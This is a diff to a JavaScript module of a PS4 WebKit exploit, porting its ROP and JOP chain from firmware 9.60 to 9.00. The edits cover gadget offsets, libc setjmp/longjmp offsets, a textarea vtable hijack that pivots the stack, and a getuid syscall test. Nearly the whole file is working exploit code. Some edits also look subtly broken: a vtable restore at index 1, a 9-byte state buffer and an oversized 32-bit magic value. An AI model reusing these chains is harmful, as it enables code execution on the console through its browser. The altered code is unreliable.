@@ -15,7 +15,7 @@ GNU Affero General Public License for more details.
 You should have received a copy of the GNU Affero General Public License
 along with this program.  If not, see <https://www.gnu.org/licenses/>.  */
 
-// by janisslsm (John) and barooney from ps4-dev discord
+// by janisslsm (John) from ps4-dev discord
 
 import * as config from './config.mjs';
 
@@ -51,8 +51,9 @@ const offset_wk_stack_chk_fail = 0x178;
 const offset_wk_memcpy = 0x188;
 
 // libSceLibcInternal offsets
-const offset_libc_setjmp = 0x21284;
-const offset_libc_longjmp = 0x254DC;
+const offset_libc_setjmp = 0x24F04;
+const offset_libc_longjmp = 0x29448;
+
 // see the disassembly of setjmp() from the dump of libSceLibcInternal.sprx
 //
 // int setjmp(jmp_buf)
@@ -83,7 +84,7 @@ let libc_base = null;
 // because jop1-5 was the original chain used by the old implementation of
 // Chain803. Now the sequence is ta_jop1-3 then to jop2-5.
 //
-// When the scrollLeft getter native function is called on PS4 9.60, rsi is the
+// When the scrollLeft getter native function is called on PS4 9.00, rsi is the
 // JS wrapper for the WebCore textarea class.
 const ta_jop1 = `
 mov rdi, qword ptr [rsi + 0x18]
@@ -100,8 +101,7 @@ call qword ptr [rax + 0xb8]
 // This will make pivoting back easy, just "leave; ret".
 const ta_jop2 = `
 pop rsi
-cmc
-jmp qword ptr [rax + 0x7c]
+jmp qword ptr [rax + 0x1c]
 `;
 const ta_jop3 = `
 mov rdi, qword ptr [rax + 8]
@@ -142,55 +142,56 @@ const jop5 = 'pop rsp; ret';
 const rop_epilogue = 'leave; ret';
 
 const webkit_gadget_offsets = new Map(Object.entries({
-    'pop rax; ret' : 0x0000000000011c46,
-    'pop rbx; ret' : 0x0000000000013730,
-    'pop rcx; ret' : 0x0000000000035a1e,
-    'pop rdx; ret' : 0x000000000018de52,
+    'pop rax; ret' : 0x0000000000051a12,
+    'pop rbx; ret' : 0x00000000000be5d0,
+    'pop rcx; ret' : 0x00000000000657b7,
+    'pop rdx; ret' : 0x000000000000986c,
 
     'pop rbp; ret' : 0x00000000000000b6,
-    'pop rsi; ret' : 0x0000000000092a8c,
-    'pop rdi; ret' : 0x000000000005d19d,
-    'pop rsp; ret' : 0x00000000000253e0,
+    'pop rsi; ret' : 0x000000000001F4D6,
+    'pop rdi; ret' : 0x0000000000319690,
+    'pop rsp; ret' : 0x000000000004e293,
 
-    'pop r8; ret' : 0x000000000003fe32,
-    'pop r9; ret' : 0x0000000000aaad51,
-    'pop r11; ret' : 0x0000000000520109,
+    'pop r8; ret' : 0x00000000001a7ef1,
+    'pop r9; ret' : 0x0000000000422571,
+    'pop r10; ret' : 0x0000000000e9e1d1,
+    'pop r11; ret' : 0x0000000000620df9,
 
-    'pop r12; ret' : 0x0000000000420ad1,
-    'pop r13; ret' : 0x00000000018fc4c1,
-    'pop r14; ret' : 0x000000000028c900,
-    'pop r15; ret' : 0x00000000001619db,
+    'pop r12; ret' : 0x000000000085ec71,
+    'pop r13; ret' : 0x00000000001da461,
+    'pop r14; ret' : 0x000000000001f4d5,
+    'pop r15; ret' : 0x000000000031968f,
 
     'ret' : 0x0000000000000032,
-    'leave; ret' : 0x0000000000056322,
+    'leave; ret' : 0x000000000008db5b,
 
-    'neg rax; and rax, rcx; ret' : 0x00000000014d2af4,
-    'adc esi, esi; ret' : 0x00000000004fd968,
-    'add rax, rdx; ret' : 0x00000000006d1a88,
-    'push rsp; jmp qword ptr [rax]' : 0x0000000002c80f76,
-    'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x00000000008e6b06,
-    'pop rsi ; cmc ; jmp qword ptr [rax + 0x7c]' : 0x0000000002bf3741,
+    'neg rax; and rax, rcx; ret' : 0x00000000019771c4,
+    'adc esi, esi; ret' : 0x000000000148874e,
+    'add rax, rdx; ret' : 0x00000000003f662c,
+    'push rsp; jmp qword ptr [rax]' : 0x0000000002bae87f,
+    'add rcx, rsi; and rdx, rcx; or rax, rdx; ret' : 0x0000000001b1ed66,
+    'pop rsi; jmp qword ptr [rax + 0x1c]' : 0x00000000021fce7e,
 
-    'mov qword ptr [rdi], rsi; ret' : 0x00000000000b2350,
-    'mov rax, qword ptr [rax]; ret' : 0x000000000000c671,
-    'mov qword ptr [rdi], rax; ret' : 0x0000000000010c07,
-    'mov dword ptr [rdi], eax; ret' : 0x00000000000071d0,
-    'mov rdx, rcx; ret' : 0x0000000000b9cb04,
-    'mov qword ptr [rsi], rcx; ret' : 0x000000000012a5ca,
+    'mov qword ptr [rdi], rsi; ret' : 0x0000000000040300,
+    'mov rax, qword ptr [rax]; ret' : 0x00000000000241cc,
+    'mov qword ptr [rdi], rax; ret' : 0x000000000000613b,
+    'mov dword ptr [rdi], eax; ret' : 0x000000000000613c,
+    'mov rdx, rcx; ret' : 0x000000000157fe71,
 
-    [jop2] : 0x00000000001a75a0,
-    [jop3] : 0x000000000035fc94,
-    [jop4] : 0x00000000002b7a9c,
-    [jop5] : 0x00000000000253e0,
+    [jop2] : 0x0000000000683800,
+    [jop3] : 0x0000000000303906,
+    [jop4] : 0x00000000028bd332,
+    [jop5] : 0x000000000004e293,
 
-    [ta_jop1] : 0x000000000060fd94,
-    [ta_jop2] : 0x0000000002bf3741,
-    [ta_jop3] : 0x000000000181e974,
+    [ta_jop1] : 0x00000000004e62a4,
+    [ta_jop2] : 0x00000000021fce7e,
+    [ta_jop3] : 0x00000000019becb4,
 }));
 
 const libc_gadget_offsets = new Map(Object.entries({
-    'neg rax; ret' : 0x00000000000d2923,
-    'mov rdx, rax; xor eax, eax; shl rdx, cl; ret' : 0x00000000000cda59,
+    'neg rax; ret' : 0x00000000000d3f03,
+    'mov rdx, rax; xor eax, eax; shl rdx, cl; ret' : 0x00000000000cefd9,
+    'mov qword ptr [rsi], rcx; ret' : 0x00000000000cf982,
     'setjmp' : offset_libc_setjmp,
     'longjmp' : offset_libc_longjmp,
 }));
@@ -231,7 +232,7 @@ function init_gadget_map(gadget_map, offset_map, base_addr) {
     }
 }
 
-class Chain960Base extends ChainBase {
+class Chain903Base extends ChainBase {
     constructor() {
         super();
 
@@ -240,7 +241,7 @@ class Chain960Base extends ChainBase {
         this.flag = new Uint8Array(8);
         this.flag_addr = get_view_vector(this.flag);
         this.jmp_target = new Uint8Array(0x100);
-        rw.write64(this.jmp_target, 0x7c, this.get_gadget(jop4));
+        rw.write64(this.jmp_target, 0x1c, this.get_gadget(jop4));
         rw.write64(this.jmp_target, 0, this.get_gadget(jop5));
 
         // for save/restore
@@ -385,7 +386,7 @@ class Chain960Base extends ChainBase {
         // rsp = rdx
         this.push_gadget('pop rax; ret');
         this.push_value(get_view_vector(this.jmp_target));
-        this.push_gadget('pop rsi ; cmc ; jmp qword ptr [rax + 0x7c]');
+        this.push_gadget('pop rsi; jmp qword ptr [rax + 0x1c]');
         this.push_constant(0); // padding for the push
 
         this.rsp_position = this.branch_position;
@@ -474,8 +475,8 @@ class Chain960Base extends ChainBase {
     }
 }
 
-// Chain for PS4 9.60
-class Chain960 extends Chain960Base {
+// Chain for PS4 9.00
+class Chain903 extends Chain903Base {
     constructor() {
         super();
 
@@ -500,7 +501,7 @@ class Chain960 extends Chain960Base {
         // 0x1b8 is the offset of the scrollLeft getter native function
         rw.write64(vtable, 0x1b8, this.get_gadget(ta_jop1));
         rw.write64(vtable, 0xb8, this.get_gadget(ta_jop2));
-        rw.write64(vtable, 0x7c, this.get_gadget(ta_jop3));
+        rw.write64(vtable, 0x1c, this.get_gadget(ta_jop3));
 
         // for the JOP chain
         const rax_ptrs = new Uint8Array(0x100);
@@ -534,17 +535,17 @@ class Chain960 extends Chain960Base {
         // jump to JOP chain
         this.textarea.scrollLeft;
         // restore vtable
-        this.webcore_ta.write64(0, this.old_vtable_p);
+        this.webcore_ta.write64(1, this.old_vtable_p);
     }
 }
-const Chain = Chain960;
+const Chain = Chain903;
 
 function init(Chain) {
     [libwebkit_base, libkernel_base, libc_base] = get_bases();
 
     init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
     init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
-    init_syscall_array(syscall_array, libkernel_base, 300 * KB);
+    init_syscall_array(syscall_array, libkernel_base, 550 * KB);
     debug_log('syscall_array:');
     debug_log(syscall_array);
     Chain.init_class(gadgets, syscall_array);
@@ -618,7 +619,7 @@ function test_rop(Chain) {
         die('if branch not taken');
     }
 
-    const state2 = new Uint8Array(8);
+    const state2 = new Uint8Array(9);
     debug_log('test if rax != 0');
     chain.clean();
 
@@ -654,7 +655,7 @@ function test_rop(Chain) {
     chain.clean();
     // Set the return value to some random value. If the syscall worked, then
     // it will likely change.
-    const magic = 0x4b435546;
+    const magic = 0x4b4355467;
     rw.write32(chain._return_value, 0, magic);
 
     chain.syscall('getuid');
@@ -665,5 +666,5 @@ function test_rop(Chain) {
     }
 }
 
-debug_log('Chain960');
+debug_log('Chain903');
 test_rop(Chain);
